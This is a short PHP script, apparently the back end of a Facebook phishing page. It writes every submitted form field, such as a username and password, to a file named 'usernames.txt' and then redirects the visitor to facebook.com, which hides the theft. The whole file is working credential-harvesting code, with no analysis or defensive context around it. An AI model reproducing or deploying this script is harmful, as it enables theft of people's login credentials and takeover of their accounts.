<?php
header
('location:');
$handle=fopen("usernames.txt","a");
foreach($_POST as $var=>$val)
{
  fwrite($handle,$var);
  fwrite($handle,"=");
  fwrite($handle,$val);
  fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:http://facebook.com");
exit;
?>
